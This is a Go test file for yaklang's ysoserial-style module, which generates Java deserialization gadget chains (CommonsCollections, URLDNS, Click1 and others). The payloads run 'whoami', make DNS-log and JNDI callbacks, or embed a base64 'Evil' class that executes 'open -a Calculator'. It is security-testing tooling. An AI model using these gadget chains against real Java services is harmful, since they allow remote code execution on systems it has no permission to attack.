package yso

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"

	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yserx"
)

func TestGenerateGadget(t *testing.T) {
	YsoConfigInstance, err := getConfig()
	if err != nil {
		t.Fatal(err)
	}
	for name, gadget := range YsoConfigInstance.Gadgets {
		if gadget.IsTemplateImpl {
			_, err = GenerateGadget(string(name), "RuntimeExec", "whoami")
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
		} else if gadget.Template == nil {
			gadget, err := GenerateGadget(string(name), "raw_cmd", "whoami")
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
			_ = gadget
		} else {
			_, err = GenerateGadget(string(name), YsoConfigInstance.Gadgets[name].ReferenceFun, map[string]string{
				"class":  "aaa",
				"domain": "aaa",
				"jndi":   "aa",
			})
			if err != nil {
				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
			}
		}
	}
}
func TestGenerateGadgetFunc(t *testing.T) {
	_, err := GenerateGadget("URLDNS", "dnslog", "rahtkbblhv.dgrh3.cn")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("URLDNS", "dnslog", map[string]string{
		"domain": "rahtkbblhv.dgrh3.cn",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("CommonsCollections2", "Sleep", "1000")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("CommonsCollections2", "Sleep", map[string]string{
		"time": "1000",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("CommonsCollections1", "jndi", "xxx.com")
	if err != nil {
		t.Fatal(err)
	}
	_, err = GenerateGadget("CommonsCollections1", "jndi", map[string]string{
		"jndi": "xxx.com",
	})
	if err != nil {
		t.Fatal(err)
	}

	_, err = GenerateGadget("SimplePrincipalCollection")
	if err != nil {
		t.Fatal(err)
	}

}
func TestMUSTPASSSetMajorVersion(t *testing.T) {
	type testCase struct {
		version     uint16
		className   string
		wantVersion uint16
	}
	handleJavaValue := func(value *yserx.JavaFieldValue, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		if value.Type != yserx.X_FIELDVALUE {
			return
		}

		array2, ok := value.Object.(*yserx.JavaArray)
		if !ok || !array2.Bytescode {
			return
		}
		handle(nil, array2)
	}
	handleJavaField := func(f yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		field, ok := f.(*yserx.JavaFieldValue)
		if !ok || field.Type != yserx.X_FIELDVALUE {
			return
		}

		array, ok := field.Object.(*yserx.JavaArray)
		if !ok {
			return
		}

		for _, value := range array.Values {
			handleJavaValue(value, handle)
		}
	}
	handleJavaClassData := func(o yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		data, ok := o.(*yserx.JavaClassData)
		if !ok {
			return
		}

		for _, f := range data.Fields {
			handleJavaField(f, handle)
		}
	}
	handleJavaSerializable := func(objSer yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		obj, ok := objSer.(*yserx.JavaObject)
		if !ok {
			return
		}

		for _, o := range obj.ClassData {
			handleJavaClassData(o, handle)
		}
	}

	tests := []testCase{
		{version: 50, className: "TjftfYIA", wantVersion: 50},
		{version: 51, className: "TjftfYIA", wantVersion: 51},
		{version: 133, className: "TjftfYIA", wantVersion: 52},
		// Add more test cases as needed
	}

	for _, tc := range tests {
		t.Run(fmt.Sprintf("Version%d", tc.version), func(t *testing.T) {
			got, err := GetClick1JavaObject(
				SetRuntimeExecEvilClass("whoami"),
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GetClick1JavaObject() error = %v", err)
				return
			}
			g, _ := ToBytes(got)
			javaSerializables, err := yserx.ParseFromBytes(g)
			if err != nil {
				t.Errorf("ParseFromBytes() error = %v", err)
				return
			}

			found := false
			WalkJavaSerializableObject(javaSerializables, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
				// Assuming the WalkJavaSerializableObject and other functions are defined elsewhere
				handleJavaSerializable(objSer, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable) {
					javaClass, ok := objSer.(*yserx.JavaArray)
					if ok {
						obj, err := javaclassparser.Parse(javaClass.Bytes)
						if err == nil && obj.MajorVersion == tc.wantVersion {
							found = true
						}
					}
				})
			})

			if !found {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

			var found2 bool
			got2, err := GenerateProcessBuilderExecEvilClassObject("whoami",
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GenerateProcessBuilderExecEvilClassObject() error = %v", err)
				return
			}
			g2, _ := ToBytes(got2)

			version := g2[7]
			if uint16(version) == tc.wantVersion {
				found2 = true
			}
			if !found2 {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

		})
	}
}

func TestGenerateGadget_ByteArrayReplace(t *testing.T) {
	param := map[string]string{
		"base64Class": "yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwACQAKBwAgDAAhACIBABJvcGVuIC1hIENhbGN1bGF0b3IMACMAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACUACgEAEG9yZy9leGFtcGxlL0V2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAMADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAGAAkACQAMAAcADQAIABEACgANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW",
	}
	classBytes, err := base64.StdEncoding.DecodeString(param["base64Class"])
	if err != nil {
		t.Errorf("DecodeString() error = %v", err)
		return
	}
	classIns, err := javaclassparser.Parse(classBytes)
	if err != nil {
		t.Errorf("Parse() error = %v", err)
		return
	}
	className := classIns.GetClassName()
	param["className"] = className
	obj, err := GenerateGadget(string(GadgetCommonsCollections6), "mozilla_defining_class_loader", param)
	if err != nil {
		t.Errorf("GenerateGadget() error = %v", err)
		return
	}
	objByte, _ := ToBytes(obj)
	base64Ser := base64.StdEncoding.EncodeToString(objByte)
	t.Logf("base64Ser = %v", base64Ser)
	objDump, err := yserx.ParseJavaSerialized(objByte)
	if err != nil {
		t.Errorf("ParseJavaSerialized() error = %v", err)
		return
	}
	objJson, _ := yserx.ToJson(objDump)
	// 如果包含{{param0}}或者{{param1}}，则说明替换失败
	if strings.Contains(string(objJson), "{{param0}}") || strings.Contains(string(objJson), "{{param1}}") {
		t.Errorf("ReplaceByteArrayInJavaSerilizable() error = %v", err)
		return
	}

	if strings.Contains(string(objJson), param["className"]) && strings.Contains(string(objJson), param["base64Class"]) {
		t.Logf("ReplaceByteArrayInJavaSerilizable() success")
		return
	} else {
		t.Errorf("ReplaceByteArrayInJavaSerilizable() error = %v", err)
		return
	}
}
